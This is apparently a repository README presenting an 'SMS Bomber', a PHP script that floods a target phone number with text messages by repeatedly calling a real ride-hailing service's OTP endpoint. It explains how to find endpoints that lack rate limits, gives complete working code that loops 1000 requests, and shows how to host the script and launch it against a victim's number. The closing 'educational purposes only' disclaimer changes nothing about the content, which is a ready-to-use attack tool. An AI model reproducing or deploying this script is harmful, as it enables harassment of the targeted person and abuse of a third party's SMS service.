# SMS Bomber AH

## Overview

This project demonstrates how to create an SMS Bomber script using PHP. The script allows sending multiple SMS messages to a target phone number by leveraging public APIs that do not have rate limits on OTP (One-Time Password) sending functionality.

## What is an SMS Bomber?

An SMS Bomber is a script that repeatedly sends SMS messages to a target number. This project uses websites that send OTPs without rate limiting or with bypassable rate limits.

## Prerequisites

- Basic understanding of PHP
- Web hosting that supports PHP
- Access to APIs from websites that send SMS OTPs

## How It Works

### Step 1: Identifying Suitable APIs

- First, find websites without rate limits on SMS OTP requests. In this example, we use the Snapp web application.
- Use the browser's developer tools (`F12`) and inspect the `Network` tab when sending an OTP request.
- Enter a phone number and observe the `POST` request sent to the endpoint `https://app.snapp.taxi/api/api-passenger-oauth/v2/otp`.

### Step 2: Writing the PHP Script

We write a PHP script that continuously sends SMS requests by interacting with the OTP API.

```php
<?php
set_time_limit(0); // Remove the timeout limit

$target = $_GET['target']; // Get the target phone number
$api_url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'; // API URL

// Prepare the request
for ($i = 0; $i < 1000; $i++) {
    $data = json_encode(['phone_number' => $target]);

    $ch = curl_init($api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    
    $response = curl_exec($ch);
    curl_close($ch);
}
?> 
```

### Step 3: Deploying the Script
Upload the PHP file to a web hosting server.
To initiate the SMS Bomber attack, open the following URL in your browser, replacing the phone number with the target's number:
arduino

http://yourdomain.com/smsbomber.php?target=9123456789

Stopping the Attack
To stop the script from running, simply close the browser or stop the page from loading.

Disclaimer
This project is intended for educational purposes only. Misuse of this script can lead to serious legal consequences. Please use it responsibly.